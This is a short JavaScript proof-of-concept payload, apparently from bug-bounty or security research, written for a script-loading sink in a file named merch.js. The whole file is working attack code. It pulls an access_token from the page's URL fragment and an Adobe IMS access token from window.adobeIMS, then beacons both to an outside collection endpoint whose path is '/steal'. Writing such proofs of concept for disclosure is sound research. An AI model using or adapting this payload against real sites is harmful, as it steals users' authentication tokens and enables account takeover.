/**
 * PoC payload — second sink (merch.js:1122 loadScriptUtil)
 * Same exfil logic, different entry point
 */

const EXFIL = 'https://klaltlv6.instances.httpworkbench.com/steal';

(() => {
  const hash = window.location.hash;
  const tokenMatch = hash.match(/access_token=([^&]+)/);
  if (tokenMatch) {
    const token = decodeURIComponent(tokenMatch[1]);
    navigator.sendBeacon(EXFIL + '?src=fragment-client&origin=' + encodeURIComponent(window.location.origin), token);
  }
  const ims = window.adobeIMS;
  if (ims) {
    const tok = ims.getAccessToken && ims.getAccessToken();
    if (tok && tok.token) {
      navigator.sendBeacon(EXFIL + '?src=fragment-client-ims', tok.token);
    }
  }
})();
